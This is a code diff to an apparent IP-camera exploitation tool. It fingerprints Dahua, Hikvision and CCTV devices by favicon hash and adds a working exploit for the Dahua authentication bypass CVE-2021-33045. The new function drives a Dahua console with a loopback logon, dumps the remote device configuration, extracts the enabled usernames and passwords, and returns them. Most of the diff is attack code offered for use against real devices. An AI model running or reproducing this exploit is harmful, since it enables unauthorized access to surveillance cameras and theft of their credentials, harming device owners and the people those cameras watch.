@@ -1,6 +1,7 @@
 """Vulnerability Exploition"""
 import os
 import sys
+import json
 import time
 import hashlib
 import requests
@@ -11,13 +12,17 @@ from utils.net import get_user_agent
 from utils.config import USERS, PASSWORDS, TIMEOUT, DEBUG
 
 
+#======================== global vars ========================
+DEV_HASH = {
+    '4ff53be6165e430af41d782e00207fda': 'dahua',
+    '89b932fcc47cf4ca3faadb0cfdef89cf': 'hikvision',
+    'f066b751b858f75ef46536f5b357972b': 'cctv'
+}
+#=============================================================
+
+
 def device_type(ip: str) -> list:
     """Check whether the ip is a web camera"""
-    dev_hash = {
-        '4ff53be6165e430af41d782e00207fda': 'dahua',
-        '89b932fcc47cf4ca3faadb0cfdef89cf': 'hikvision',
-        'f066b751b858f75ef46536f5b357972b': 'cctv'
-    }
     url_list = [
         f"http://{ip}/favicon.ico",  # hikvision, cctv
         f"http://{ip}/image/lgbg.jpg",  # Dahua
@@ -27,13 +32,13 @@ def device_type(ip: str) -> list:
         r = requests.get(url_list[0], timeout=TIMEOUT, verify=False)
         if r.status_code == 200:
             hash_val = hashlib.md5(r.content).hexdigest()
-            if hash_val in dev_hash: return dev_hash[hash_val]
+            if hash_val in DEV_HASH: return DEV_HASH[hash_val]
     except: pass
     try:
         r = requests.get(url_list[1], timeout=TIMEOUT, verify=False)
         if r.status_code == 200:
             hash_val = hashlib.md5(r.content).hexdigest()
-            if hash_val in dev_hash: return dev_hash[hash_val]
+            if hash_val in DEV_HASH: return DEV_HASH[hash_val]
     except: pass
     try:
         r = requests.get(url_list[2], timeout=TIMEOUT, verify=False)
@@ -156,13 +161,13 @@ def cve_2021_33044(ip: str) -> list:
 
         def dh_console(proto='dhip'):
             console = os.path.join(CWD, 'lib/DahuaConsole/Console.py')
-            user, paswd = '', ''
+            user, passwd = '', ''
             try:
                 with os.popen(f"""
                 (
                     echo "OnvifUser -u"
                     echo "quit all"
-                ) | python3 -Bu {console} --logon netkeyboard --rhost {ip} --rport {port} --proto {proto}
+                ) | python3 -Bu {console} --logon netkeyboard --rhost {ip} --rport {port} --proto {proto} 2>/dev/null
                 """) as f: items = [line.strip() for line in f]
                 for idx, val in enumerate(items):
                     if 'Name' in val:
@@ -182,6 +187,36 @@ def cve_2021_33044(ip: str) -> list:
 
         return [True, user, passwd, 'Dahua', 'cve-2021-33044']
     return [False, ]
+
+
+def cve_2021_33045(ip: str) -> list:
+    """(Dahua NVR) Bypassing authentication vulnerability"""
+    if ':' in ip: ip, port = ip.split(':')
+    else: port = 80
+    console = os.path.join(CWD, 'lib/DahuaConsole/Console.py')
+    json_file = f"{ip}-{port}-users.json"
+
+    with os.popen(f"""
+    (
+        echo "config RemoteDevice save {json_file}"
+        echo "quit all"
+    ) | python3 -Bu {console} --logon loopback --rhost {ip} --rport {port} --proto dhip 2>/dev/null
+    """) as f: items = f.readlines()
+    # print(''.join(items))
+
+    # success
+    if os.path.exists(json_file):
+        with open(json_file, 'r') as f:
+            info = json.load(f)
+        dev_all = info['params']['table'].values()
+        dev_alive = [i for i in dev_all if i['Enable']]
+        user = dev_alive[0]['UserName']
+        passwd = dev_alive[0]['Password']
+        os.remove(json_file)
+        return [True, user, passwd, f"Dahua-{len(dev_alive)}", 'cve-2021-33045']
+    # fail
+    else:
+        return [False, ]
 
 
 def cve_2020_25078(ip: str) -> list:
@@ -235,6 +270,7 @@ modules = {
     # dahua
     'dahua_weak': dahua_weak,
     'cve_2021_33044': cve_2021_33044,
+    'cve_2021_33045': cve_2021_33045,
 
     # cctv
     'cctv_weak': cctv_weak,
